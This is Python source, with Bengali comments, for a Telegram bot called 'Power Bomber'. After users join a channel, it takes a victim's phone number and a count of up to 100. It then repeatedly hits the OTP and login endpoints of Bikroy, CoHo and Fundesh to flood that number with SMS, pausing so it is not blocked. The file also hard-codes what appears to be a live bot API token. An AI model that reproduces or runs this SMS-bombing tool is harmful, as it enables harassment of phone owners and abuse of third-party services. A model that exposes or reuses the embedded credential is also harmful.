import telebot
import requests
import time
import random
from telebot import types
from flask import Flask
from threading import Thread

# ১. সেটিংস
API_TOKEN = '8678067992:AAEDkPkmtuz86YnrMJcnIVcp19tL52tkyRk'
CHANNEL_USERNAME = '@developer_of_maruf' 

bot = telebot.TeleBot(API_TOKEN)
user_data = {}

# ২. সার্ভার সচল রাখার জন্য Flask
app = Flask('')
@app.route('/')
def home(): return "Power Bomber is Live!"

def run():
    app.run(host='0.0.0.0', port=8080)

def keep_alive():
    t = Thread(target=run)
    t.start()

def check_join(chat_id):
    try:
        # বোটকে অবশ্যই চ্যানেলের অ্যাডমিন হতে হবে
        status = bot.get_chat_member(CHANNEL_USERNAME, chat_id).status
        return status in ['member', 'administrator', 'creator']
    except:
        return False

@bot.message_handler(commands=['start'])
def welcome(message):
    chat_id = message.chat.id
    if check_join(chat_id):
        bot.send_message(chat_id, "✅ **ভেরিফিকেশন সফল!**", parse_mode="Markdown")
        msg = bot.send_message(chat_id, "🚀 SMS পাঠাতে এখন নাম্বারটি দিন (১১ ডিজিট):")
        bot.register_next_step_handler(msg, get_number)
    else:
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("📢 Join Channel", url=f"https://t.me/developer_of_maruf"))
        markup.add(types.InlineKeyboardButton("✅ Verify Done", callback_data="verify_join"))
        bot.send_message(chat_id, "❌ আগে জয়েন করুন!", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data == "verify_join")
def verify_join(call):
    if check_join(call.message.chat.id):
        bot.delete_message(call.message.chat.id, call.message.message_id)
        welcome(call.message)
    else:
        bot.answer_callback_query(call.id, "❌ আগে জয়েন করুন!", show_alert=True)

def get_number(message):
    if not message.text.isdigit() or len(message.text) < 11:
        msg = bot.send_message(message.chat.id, "❌ সঠিক ১১ ডিজিটের নাম্বার দিন:")
        bot.register_next_step_handler(msg, get_number)
        return
    user_data[message.chat.id] = message.text
    msg = bot.send_message(message.chat.id, "🔢 কতটি SMS পাঠাতে চান? (সর্বোচ্চ ১০০)")
    bot.register_next_step_handler(msg, send_bomber)

def send_bomber(message):
    try:
        amount = int(message.text)
        num = user_data[message.chat.id]
        if amount > 100: amount = 100 
        
        bot.send_message(message.chat.id, f"🚀 {num} নাম্বারে {amount}টি SMS পাঠানো শুরু হচ্ছে...")
        
        sent = 0
        for i in range(amount):
            try:
                # API 1: Bikroy
                requests.get(f"https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={num}", timeout=5)
                
                # API 2: CoHo (Example API)
                requests.post("https://api.coho.ai/v1/otp", json={"phone": num}, timeout=5)
                
                # API 3: Fundesh (Example API)
                requests.get(f"https://fundesh.com.bd/api/auth/send-otp?phone={num}", timeout=5)
                
                sent += 1
                # প্রতি ৩টি SMS এর পর ২ সেকেন্ড বিরতি যাতে ব্লক না করে
                if sent % 3 == 0:
                    time.sleep(2)
            except:
                continue
                
        bot.send_message(message.chat.id, f"✅ কাজ শেষ! {sent}টি রিকোয়েস্ট সফল হয়েছে।")
    except:
        bot.send_message(message.chat.id, "❌ কোনো সমস্যা হয়েছে। আবার /start দিন।")

if __name__ == "__main__":
    keep_alive()
    bot.infinity_polling(skip_pending=True)
